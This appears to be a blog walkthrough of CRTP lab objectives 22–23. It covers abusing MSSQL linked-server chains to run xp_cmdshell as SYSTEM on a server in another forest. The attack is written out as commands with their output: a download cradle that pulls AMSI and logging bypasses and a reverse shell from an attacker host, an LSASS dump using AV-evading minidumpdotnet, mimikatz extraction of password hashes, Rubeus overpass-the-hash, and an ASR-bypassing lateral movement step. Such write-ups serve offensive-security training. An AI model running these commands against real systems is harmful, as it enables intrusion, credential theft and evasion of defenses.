---
title: "CRTP Deep Dive: MSSQL Database Links — Cross-Forest Reverse Shell & LSASS Dump (OBJ 22-23)"
date: 2026-04-11 11:30:00 +0200
categories: [Red Team, CRTP]
tags: [mssql, database-links, xp-cmdshell, powerupsql, reverse-shell, lsass-dump, minidumpdotnet, asr-bypass, wsmanwinrm, lateral-movement, cross-forest]
description: "Abuse MSSQL linked server chains to jump from dcorp-mssql through three SQL servers into the eurocorp forest, gain a reverse shell as SYSTEM, dump LSASS with minidumpdotnet, and move laterally with ASR bypass techniques."
pin: false
math: false
mermaid: false
---

> This blog covers **Learning Objectives 22 and 23** from the CRTP course by Altered Security.
> All commands are **PowerShell / Windows only**. No Linux commands anywhere.
{: .prompt-info }

---

## What Are MSSQL Database Links?

SQL Server allows administrators to configure **Linked Servers** — trusted connections between two SQL Server instances that let you query a remote server as if it were local. Think of it like a chain of tunnels between databases.

```
┌──────────────────────────────────────────────────────────────────────┐
│               MSSQL Linked Server — Normal Use Case                  │
│                                                                      │
│   Server A (dcorp-mssql)                                             │
│  ┌───────────────────────┐                                           │
│  │  SELECT * FROM        │                                           │
│  │  openquery("SERVER-B",│──────────────────►  Server B             │
│  │  'SELECT * FROM ...')  │    linked server   (remote query runs    │
│  └───────────────────────┘    connection       here, result returns) │
│                                                                      │
│   Used legitimately for:                                             │
│   - Reporting across multiple DB servers                             │
│   - Distributed queries                                              │
│   - Cross-domain data access                                         │
└──────────────────────────────────────────────────────────────────────┘
```

**The abuse:** Each linked server connection runs under a configured login account. If the final server in a chain runs queries as `sa` (sysadmin), you can execute OS commands via `xp_cmdshell` — all the way from your initial low-privilege connection, hopping across every link in the chain.

---

## The Attack Chain in This Lab

```
┌──────────────────────────────────────────────────────────────────────────┐
│               Full MSSQL Link Chain — Lab Overview                       │
│                                                                          │
│  You (dcorp\studentX)                                                    │
│       │  Windows Auth (low-priv)                                         │
│       ▼                                                                  │
│  ┌─────────────────────────────────────────────────────────────────────┐ │
│  │  DCORP-MSSQL  (dollarcorp.moneycorp.local)                          │ │
│  │  Login: dcorp\studentX   │  IsSysAdmin: No                          │ │
│  └──────────────────────────┼──────────────────────────────────────────┘ │
│                             │  Linked Server → login: dblinkuser         │
│                             ▼                                            │
│  ┌─────────────────────────────────────────────────────────────────────┐ │
│  │  DCORP-SQL1   (dollarcorp.moneycorp.local)                          │ │
│  │  Login: dblinkuser        │  IsSysAdmin: No                         │ │
│  └──────────────────────────┼──────────────────────────────────────────┘ │
│                             │  Linked Server → login: sqluser            │
│                             ▼                                            │
│  ┌─────────────────────────────────────────────────────────────────────┐ │
│  │  DCORP-MGMT   (dollarcorp.moneycorp.local)                          │ │
│  │  Login: sqluser           │  IsSysAdmin: No                         │ │
│  └──────────────────────────┼──────────────────────────────────────────┘ │
│                             │  Linked Server → login: sa (!)             │
│                             ▼                                            │
│  ┌─────────────────────────────────────────────────────────────────────┐ │
│  │  eu-sqlx      (eu.eurocorp.local)  ← Different forest!             │ │
│  │  Login: sa                │  IsSysAdmin: YES ✅                     │ │
│  └─────────────────────────────────────────────────────────────────────┘ │
│                             │                                            │
│                             ▼                                            │
│  xp_cmdshell → OS commands as SYSTEM on eu-sqlx ✅                       │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Tools Used

```
┌──────────────────────────────────────────────────────────────────────┐
│                Tools Reference — OBJ 22 & 23                         │
├──────────────────────────────┬───────────────────────────────────────┤
│ Tool                         │ Purpose                               │
├──────────────────────────────┼───────────────────────────────────────┤
│ PowerUpSQL                   │ Enumerate SQL servers, crawl links,   │
│                              │ execute queries across linked servers  │
├──────────────────────────────┼───────────────────────────────────────┤
│ HeidiSQL                     │ GUI SQL client for manual exploration  │
├──────────────────────────────┼───────────────────────────────────────┤
│ Invoke-PowerShellTcpEx.ps1   │ PowerShell reverse shell payload       │
├──────────────────────────────┼───────────────────────────────────────┤
│ minidumpdotnet.dll + mini.ps1│ Custom LSASS dump using non-standard  │
│                              │ MiniDumpWriteDump API (AV-evading)    │
├──────────────────────────────┼───────────────────────────────────────┤
│ reverse.exe                  │ Reverses bytes of .dmp to evade AV    │
│                              │ file detection on-disk                 │
├──────────────────────────────┼───────────────────────────────────────┤
│ mimikatz.exe                 │ Parses the reversed minidump to       │
│                              │ extract credentials                    │
├──────────────────────────────┼───────────────────────────────────────┤
│ WSManWinRM.exe               │ WinRM lateral movement that bypasses  │
│                              │ the "Block PSExec/WMI process         │
│                              │ creations" ASR rule                    │
└──────────────────────────────┴───────────────────────────────────────┘
```

---

## Learning Objective 22 — Reverse Shell via MSSQL Links

### Step 1 — Start PowerShell with Invisi-Shell

Always start PowerShell via Invisi-Shell to avoid PowerShell ScriptBlock logging:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

Then import PowerUpSQL:

```powershell
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
```

---

### Step 2 — Find Accessible SQL Servers

```powershell
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```

**Example Output:**
```
VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local,1433 : Connection Failed.
VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local : Connection Failed.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local,1433 : Connection Success.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local,1433 : Connection Failed.
VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local : Connection Failed.

ComputerName            : dcorp-mssql.dollarcorp.moneycorp.local
Instance                : DCORP-MSSQL
DomainName              : dcorp
ServiceProcessID        : 1896
ServiceName             : MSSQLSERVER
ServiceAccount          : NT Service\MSSQLSERVER
AuthenticationMode      : Windows and SQL Server Authentication
ForcedEncryption        : 0
Clustered               : No
SQLServerVersionNumber  : 15.0.2000.5
SQLServerMajorVersion   : 2019
SQLServerEdition        : Developer Edition (64-bit)
SQLServerServicePack    : RTM
OSArchitecture          : X64
Currentlogin            : dcorp\studentx
IsSysadmin              : No
ActiveSessions          : 1
```

> We can connect to `dcorp-mssql` using our current Windows credentials. `IsSysadmin: No` means we cannot run `xp_cmdshell` here directly — but we can follow the linked server chain to find one where we can.
{: .prompt-tip }

---

### Step 3 — Manual Enumeration with HeidiSQL (SQL Queries)

Connect to `dcorp-mssql` using Windows Authentication in HeidiSQL, then run these queries manually.

#### Query 1 — Find linked servers on dcorp-mssql

```sql
select * from master..sysservers
```

**Result:** Shows a link to `DCORP-SQL1`.

#### Query 2 — Find links on dcorp-sql1 (via openquery)

```sql
select * from openquery("DCORP-SQL1",'select * from master..sysservers')
```

**Result:** Shows a link from `DCORP-SQL1` to `DCORP-MGMT`.

#### Query 3 — Nested openquery to reach dcorp-mgmt's links

```sql
select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
```

> Notice the double single-quotes `''` inside the inner openquery string — this is SQL string escaping. Each level of nesting requires an extra layer of escaping.
{: .prompt-info }

**Result:** Shows `eu-sqlx.EU.EUROCORP.LOCAL` linked from `DCORP-MGMT`.

```
┌──────────────────────────────────────────────────────────────────────┐
│              openquery Nesting — How It Works                        │
│                                                                      │
│  Level 1:  You query DCORP-MSSQL directly                           │
│  Level 2:  openquery("DCORP-SQL1", '...')                            │
│            → DCORP-MSSQL sends query to DCORP-SQL1                  │
│  Level 3:  openquery("DCORP-SQL1", 'openquery("DCORP-MGMT",''...'')')│
│            → DCORP-MSSQL → DCORP-SQL1 → DCORP-MGMT                 │
│                                                                      │
│  Each hop adds one more quote-escaping layer.                        │
│  PowerUpSQL's Get-SQLServerLinkCrawl handles this automatically.    │
└──────────────────────────────────────────────────────────────────────┘
```

---

### Step 4 — Automatic Link Crawl with PowerUpSQL

Instead of nesting openquery manually, use `Get-SQLServerLinkCrawl` to crawl all links automatically:

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```

**Example Output:**
```
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MSSQL
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL
VERBOSE:  - Link Login: dcorp\studentadmin
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-SQL1

VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-SQL1
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1
VERBOSE:  - Link Login: dblinkuser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-MGMT

VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MGMT
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT
VERBOSE:  - Link Login: sqluser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: eu-sqlx.EU.EUROCORP.LOCAL

VERBOSE: --------------------------------
VERBOSE:  Server: eu-sqlx
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT -> eu-sqlx.EU.EUROCORP.LOCAL
VERBOSE:  - Link Login: sa
VERBOSE:  - Link IsSysAdmin: 1         ← SYSADMIN!
VERBOSE:  - Link Count: 0
VERBOSE:  - Links on this server:

Version     : SQL Server 2019
Instance    : DCORP-MSSQL
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\studentx
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {eu-sqlx.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : eu-sqlx
CustomQuery :
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, eu-sqlx.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

> `eu-sqlx` — `IsSysAdmin: 1` and `User: sa`. This means any query that reaches `eu-sqlx` runs as SQL Server's `sa` account, which is a sysadmin. We can run `xp_cmdshell` here.
{: .prompt-warning }

---

### Step 5 — Test Command Execution via xp_cmdshell

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
```

**Example Output:**
```
Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\studentx
Links       : {DCORP-SQL1}

[snip — intermediate hops show no output]

Version     : SQL Server 2019
Instance    : eu-sqlx
CustomQuery : {USERNAME=SYSTEM, }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL, eu-sqlx.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

`CustomQuery: {USERNAME=SYSTEM, }` confirms OS command execution as `SYSTEM` on `eu-sqlx`.

---

### Step 6 — Prepare the Reverse Shell Payload

#### Create Invoke-PowerShellTcpEx.ps1

1. Copy `C:\AD\Tools\Invoke-PowerShellTcp.ps1` and rename to `Invoke-PowerShellTcpEx.ps1`
2. Open it in PowerShell ISE (right-click → Edit)
3. Add this line at the **very end** of the file (replace X with your student number):

```powershell
Power -Reverse -IPAddress 172.16.100.X -Port 443
```

```
┌──────────────────────────────────────────────────────────────────────┐
│              Invoke-PowerShellTcpEx.ps1 — What the extra line does   │
│                                                                      │
│  Normal Invoke-PowerShellTcp.ps1:                                    │
│  → Defines the Power function but does NOT call it                   │
│  → You must call it manually after importing                         │
│                                                                      │
│  Invoke-PowerShellTcpEx.ps1:                                         │
│  → Defines the Power function AND calls it automatically             │
│  → When executed via iex (download cradle), it immediately connects  │
│     back to your listener without needing a separate invocation      │
│  → The extra line at the end IS the trigger                          │
└──────────────────────────────────────────────────────────────────────┘
```

> Make sure `Invoke-PowerShellTcpEx.ps1`, `sbloggingbypass.txt`, and `Amsi-Byp.txt` are all hosted on your student VM's HTTP server (HFS or Python). They are fetched remotely by `eu-sqlx` during execution.
{: .prompt-tip }

---

### Step 7 — Start the Netcat Listener

Open a new PowerShell window and run:

```powershell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

```
listening on [any] 443 ...
```

---

### Step 8 — Execute the Reverse Shell via xp_cmdshell

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.X/Amsi-Byp.txt);iex (iwr -UseBasicParsing http://172.16.100.X/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
```

**Parameter breakdown:**
```
┌─────────────────────────────────────────────────────────────────────┐
│           Get-SQLServerLinkCrawl — Parameter Reference              │
├──────────────────────────────┬──────────────────────────────────────┤
│ -Instance dcorp-mssql        │ Entry point (first SQL server)       │
│ -Query '...'                 │ SQL query to execute (xp_cmdshell)   │
│ -QueryTarget eu-sqlx         │ Force execution on eu-sqlx only      │
│ sbloggingbypass.txt          │ Disables PowerShell script block log │
│ Amsi-Byp.txt                 │ Bypasses AMSI (AV memory scanning)   │
│ Invoke-PowerShellTcpEx.ps1   │ Reverse shell payload with auto-call │
└──────────────────────────────┴──────────────────────────────────────┘
```

**On your listener (nc64.exe window):**
```
listening on [any] 443 ...
172.16.15.17: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [172.16.100.X] from (UNKNOWN) [172.16.15.17] 50410: NO_DATA

Windows PowerShell running as user eu-sqlx$ on eu-sqlx
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> $env:username
system

PS C:\Windows\system32> $env:computername
eu-sqlx
```

You have a SYSTEM shell on `eu-sqlx` in the `eu.eurocorp.local` forest.

---

## Learning Objective 23 — OpSec: LSASS Dump & ASR Bypass

**Goal:** Re-compromise `eu-sqlx` using detection-evasion techniques — no suspicious HTTP downloads, no standard LSASS dump APIs, no blocked WinRM process chains.

```
┌──────────────────────────────────────────────────────────────────────────┐
│              OBJ 23 — Full OpSec Attack Flow                             │
│                                                                          │
│  Phase 1: LSASS Dump via xp_cmdshell                                    │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  1. Copy mini.ps1 → eu-sqlx via xcopy (SMB share)                 │  │
│  │  2. Copy minidumpdotnet.dll → HTTP server (HFS)                   │  │
│  │  3. Run mini.ps1 → downloads dll → dumps LSASS → reverse.dmp     │  │
│  │  4. Copy reverse.dmp back to student VM via xcopy                 │  │
│  │  5. Reverse.exe flips byte order → reversex.dmp                   │  │
│  │  6. mimikatz parses reversex.dmp → gets dbadmin creds             │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  Phase 2: Lateral Movement with Overpass-the-Hash                       │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  7. Rubeus asktgt → TGT for dbadmin in eu.eurocorp.local          │  │
│  │  8. winrs → shell on eu-sqlx as dbadmin (flagged by MDI)         │  │
│  │  9. WSManWinRM.exe → bypasses ASR rule, uses WinRM directly       │  │
│  └────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

---

### Why minidumpdotnet Instead of Standard Tools?

```
┌──────────────────────────────────────────────────────────────────────────┐
│          Standard LSASS Dump vs. minidumpdotnet                          │
│                                                                          │
│  Standard (ProcDump / Task Manager / comsvcs.dll):                       │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  Uses Windows MiniDumpWriteDump() API call                        │  │
│  │  MDE / AV hooks this API → immediate detection                    │  │
│  │  .dmp file on disk also triggers AV                               │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  minidumpdotnet (custom implementation):                                 │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  Reimplements the minidump functionality from scratch              │  │
│  │  Does NOT call MiniDumpWriteDump() → API hook bypass              │  │
│  │  Writes reversed bytes to disk → AV signature bypass              │  │
│  │  reverse.exe flips the bytes back on your safe student VM         │  │
│  └────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

---

### Phase 1 — Set Up the SMB Share on Student VM

#### Enable Guest Access (if not already done)

> Guest access allows `eu-sqlx` (running as SYSTEM or a machine account) to access your student VM's share without needing credentials.
{: .prompt-info }

```
Win + R → lusrmgr.msc → Users → Guest → Properties
→ Uncheck "Account is disabled" → Apply → OK
```

#### Create the Share

Using File Explorer or PowerShell:
- Create folder: `C:\AD\Tools\studentsharex`
- Share name: `studentsharex`
- Permissions: Everyone — Read & Write

#### Copy Tools to Share

```powershell
copy C:\AD\Tools\minidumpdotnet.dll \\dcorp-studentx\studentsharex
copy C:\AD\Tools\mini.ps1 \\dcorp-studentx\studentsharex
copy C:\AD\Tools\reverse.exe \\dcorp-studentx\studentsharex
```

> Also host `minidumpdotnet.dll` on your HFS HTTP server — `mini.ps1` downloads it from there at runtime on eu-sqlx.
{: .prompt-warning }

---

### Phase 1 — Copy mini.ps1 to eu-sqlx via xp_cmdshell

Start InvisiShell and import PowerUpSQL, then:

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''xcopy \\dcorp-stdx.dollarcorp.moneycorp.local\studentsharex\mini.ps1 C:\Users\Public''' -QueryTarget eu-sqlx
```

**Example Output:**
```
Version     : SQL Server 2019
Instance    : eu-sqlx
CustomQuery : {\\dcorp-stdX.dollarcorp.moneycorp.local\studentsharex\mini.ps1, 1 File(s) copied, }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, eu-sqlx.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

`1 File(s) copied` confirms the file landed on `eu-sqlx` at `C:\Users\Public\mini.ps1`.

---

### Phase 1 — Run mini.ps1 to Dump LSASS

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell C:\Users\Public\mini.ps1''' -QueryTarget eu-sqlx
```

> `mini.ps1` downloads `minidumpdotnet.dll` from your HTTP server, loads it into memory, and uses it to dump LSASS to `C:\Users\Public\reverse.dmp` (with reversed bytes).
{: .prompt-info }

---

### Phase 1 — Copy the .dmp File Back to Student VM

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''xcopy C:\Users\Public\reverse.dmp \\dcorp-stdx.dollarcorp.moneycorp.local\studentsharex\''' -QueryTarget eu-sqlx
```

**Example Output:**
```
Version     : SQL Server 2019
Instance    : eu-sqlx
CustomQuery : {C:\Users\Public\reverse.dmp, 1 File(s) copied, }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, eu-sqlx.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

---

### Phase 1 — Reverse the .dmp File Bytes

```powershell
C:\AD\Tools\studentsharex\Reverse.exe "C:\AD\Tools\studentsharex\reverse.dmp" "C:\AD\Tools\studentsharex\reversex.dmp"
```

**Example Output:**
```
Reversed file content has been written to C:\AD\Tools\studentsharex\reversex.dmp
```

```
┌──────────────────────────────────────────────────────────────────────┐
│              Why Reverse the Bytes?                                  │
│                                                                      │
│  minidumpdotnet writes bytes in reversed order on eu-sqlx            │
│  → If AV scans the file on disk, it sees garbage (not a valid .dmp) │
│  → No AV signature match → file survives on disk                    │
│                                                                      │
│  reverse.exe reads the file and flips the bytes back                 │
│  → On your student VM (where you can disable Defender)               │
│  → Result: reversex.dmp is a valid minidump readable by mimikatz    │
└──────────────────────────────────────────────────────────────────────┘
```

---

### Phase 1 — Parse the Minidump with mimikatz

Run from an **elevated (Run as Administrator)** shell. Also disable Windows Defender on student VM before this step:

```powershell
C:\AD\Tools\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\studentsharex\reversex.dmp" "sekurlsa::ekeys" "exit"
```

**Example Output:**
```
  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi`
 ## \ / ##
 '## v ##'
  '#####'

[....snip....]

Authentication Id : 0 ; 211297 (00000000:00033961)
Session           : RemoteInteractive from 2
User Name         : dbadmin
Domain            : EU
Logon Server      : EU-DC
Logon Time        : 12/31/2025 3:30:42 AM
SID               : S-1-5-21-3665721161-1121904292-1901483061-1105

         * Username : dbadmin
         * Domain   : EU.EUROCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f
           rc4_hmac_nt       0553b02b95f64f7a3c27b9029d105c27
           rc4_hmac_old      0553b02b95f64f7a3c27b9029d105c27
           rc4_md4           0553b02b95f64f7a3c27b9029d105c27
           rc4_hmac_nt_exp   0553b02b95f64f7a3c27b9029d105c27
```

> Note down the `aes256_hmac` for `dbadmin` in `EU.EUROCORP.LOCAL` — this is used in Overpass-the-Hash.
{: .prompt-tip }

---

### Phase 2 — Overpass-the-Hash for dbadmin

Use the `aes256_hmac` key to request a TGT for `dbadmin` in the `eu.eurocorp.local` domain. Run from an **elevated** shell:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:dbadmin /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

**Example Output:**
```
[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: ef21ff273f16d437948ca755d010d5a1571a5bda...
[*] Building AS-REQ (w/ preauth) for: 'eu.eurocorp.local\dbadmin'
[*] Using domain controller: eu-dc.eu.eurocorp.local
[+] TGT request successful!
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/EU.EUROCORP.LOCAL
  ServiceRealm             :  EU.EUROCORP.LOCAL
  UserName                 :  dbadmin
  UserRealm                :  EU.EUROCORP.LOCAL
  StartTime                :  4/11/2026 11:30:00 AM
  EndTime                  :  4/11/2026 9:30:00 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
```

A new `cmd.exe` window opens running as `dbadmin`. All subsequent commands run from that window.

---

### Phase 2 — Lateral Movement to eu-sqlx

#### Method 1 — winrs (Detected by MDI)

```powershell
winrs -r:eu-sqlx.eu.eurocorp.local cmd
```

**Example Output:**
```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dbadmin> set username
USERNAME=dbadmin
```

> `winrs` works but **MDI (Microsoft Defender for Identity) detects this lateral movement**. For a cleaner approach, use WSManWinRM.exe instead.
{: .prompt-warning }

#### Method 2 — WSManWinRM.exe (ASR Bypass)

```
┌──────────────────────────────────────────────────────────────────────────┐
│           ASR Rule: Block Process Creations from PSExec/WMI              │
│                                                                          │
│  What it blocks:                                                         │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  Any child process spawned from:                                   │  │
│  │  - WmiPrvSE.exe (WMI)                                              │  │
│  │  - PsExec / service creation                                       │  │
│  │  - WSMan / WinRM (if not in exclusion path)                       │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  WSManWinRM.exe bypass:                                                  │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  Appends "C:\AD\Tools" (or "C:\Windows\ccmcache\") to the command │  │
│  │  → This path is in the ASR exclusion list in the lab config       │  │
│  │  → Process creation from this path is not blocked                 │  │
│  │  Uses WinRM protocol directly (not PSExec/WMI parent process)     │  │
│  └────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

Run from the `dbadmin` process window:

```powershell
C:\AD\Tools\WSManWinRM.exe eu-sqlx.eu.eurocorp.local "cmd /c set username C:\Windows\ccmcache\"
```

**Example Output:**
```
[*] Creating session with the remote system...
[*] Connected to the remote WinRM system
[*] Result Code: 000001C1F2FD2AC8
```

> The command output is not shown inline. To capture output, redirect it to your SMB share.
{: .prompt-info }

#### Capture Command Output via Share Redirect

```powershell
C:\AD\Tools\WSManWinRM.exe eu-sqlx.eu.eurocorp.local "cmd /c dir >> \\dcorp-stdx.dollarcorp.moneycorp.local\studentsharex\out.txt C:\Windows\ccmcache\"
```

**Example Output:**
```
[*] Creating session with the remote system...
[*] Connected to the remote WinRM system
[*] Result Code: 000001C1F2FD2AC8
```

Then on your student VM:
```powershell
type C:\AD\Tools\studentsharex\out.txt
```

```
 Volume in drive C has no label.
 Volume Serial Number is 3B2A-1C4D

 Directory of C:\Windows\system32

[listing of C:\Windows\system32 ...]
```

---

## Full Attack Summary

```
┌──────────────────────────────────────────────────────────────────────────┐
│              OBJ 22 + 23 — Complete Attack Timeline                      │
│                                                                          │
│  OBJ 22 — Reverse Shell via DB Links                                    │
│  ──────────────────────────────────                                      │
│  1. InvisiShell → Import PowerUpSQL                                      │
│  2. Get-SQLInstanceDomain → find dcorp-mssql is accessible               │
│  3. HeidiSQL: sysservers → dcorp-sql1 → dcorp-mgmt → eu-sqlx             │
│  4. Get-SQLServerLinkCrawl → confirm sa + IsSysAdmin on eu-sqlx          │
│  5. Get-SQLServerLinkCrawl -Query "xp_cmdshell 'set username'"           │
│     → CustomQuery: USERNAME=SYSTEM ✅                                     │
│  6. Create Invoke-PowerShellTcpEx.ps1 with auto-call line               │
│  7. nc64.exe -lvp 443 (start listener)                                   │
│  8. Get-SQLServerLinkCrawl -Query xp_cmdshell download cradle            │
│     → Shell on eu-sqlx as SYSTEM ✅                                       │
│                                                                          │
│  OBJ 23 — OpSec Re-compromise                                            │
│  ─────────────────────────────                                           │
│  1. Enable Guest on student VM, create studentsharex share               │
│  2. Copy mini.ps1 → eu-sqlx via xcopy (SMB, no HTTP)                    │
│  3. Run mini.ps1 on eu-sqlx → LSASS → reverse.dmp                       │
│  4. xcopy reverse.dmp back to student VM share                          │
│  5. Reverse.exe → reversex.dmp (valid minidump)                          │
│  6. mimikatz sekurlsa::minidump → dbadmin aes256 extracted               │
│  7. Rubeus asktgt dbadmin /domain:eu.eurocorp.local /ptt                 │
│  8. winrs → shell as dbadmin (works, flagged by MDI)                    │
│  9. WSManWinRM.exe → ASR bypass → shell via WinRM ✅                     │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Detection Notes

```
┌──────────────────────────────────────────────────────────────────────────┐
│              What Gets Detected vs. What Doesn't                         │
├──────────────────────────────┬───────────────────────────────────────────┤
│ Technique                    │ Detection Status                          │
├──────────────────────────────┼───────────────────────────────────────────┤
│ xp_cmdshell over linked srv  │ ⚠ SQL Server audit logs (if enabled)     │
├──────────────────────────────┼───────────────────────────────────────────┤
│ HTTP download cradle         │ ⚠ MDE network inspection                 │
├──────────────────────────────┼───────────────────────────────────────────┤
│ SMB file copy (xcopy)        │ ✅ Less suspicious than HTTP download     │
├──────────────────────────────┼───────────────────────────────────────────┤
│ Standard MiniDumpWriteDump   │ ❌ Detected by MDE/AV immediately        │
├──────────────────────────────┼───────────────────────────────────────────┤
│ minidumpdotnet (custom API)  │ ✅ Not detected by MDE                   │
├──────────────────────────────┼───────────────────────────────────────────┤
│ reversed .dmp on disk        │ ✅ AV does not match signature           │
├──────────────────────────────┼───────────────────────────────────────────┤
│ winrs lateral movement       │ ⚠ Detected by MDI                        │
├──────────────────────────────┼───────────────────────────────────────────┤
│ WSManWinRM.exe + ccmcache\   │ ✅ Bypasses ASR rule block               │
└──────────────────────────────┴───────────────────────────────────────────┘
```

---

## Quick Reference Cheat Sheet

```
┌──────────────────────────────────────────────────────────────────────────┐
│              MSSQL Database Links — Full Cheat Sheet (OBJ 22-23)         │
│                                                                          │
│  ── SETUP ─────────────────────────────────────────────────────────── │
│                                                                          │
│  C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat                       │
│  Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1            │
│                                                                          │
│  ── ENUMERATION ────────────────────────────────────────────────────── │
│                                                                          │
│  # Find accessible SQL servers                                           │
│  Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose                     │
│                                                                          │
│  # Crawl all database links                                              │
│  Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
│                                                                          │
│  ── MANUAL SQL QUERIES (HeidiSQL) ─────────────────────────────────── │
│                                                                          │
│  -- Links on current server                                              │
│  select * from master..sysservers                                        │
│                                                                          │
│  -- Links on DCORP-SQL1                                                  │
│  select * from openquery("DCORP-SQL1",'select * from master..sysservers')
│                                                                          │
│  -- Links on DCORP-MGMT (nested)                                         │
│  select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
│                                                                          │
│  ── COMMAND EXECUTION ──────────────────────────────────────────────── │
│                                                                          │
│  # Test xp_cmdshell on eu-sqlx                                           │
│  Get-SQLServerLinkCrawl -Instance dcorp-mssql                            │
│    -Query "exec master..xp_cmdshell 'set username'"                     │
│                                                                          │
│  # Reverse shell via download cradle                                     │
│  Get-SQLServerLinkCrawl -Instance dcorp-mssql                            │
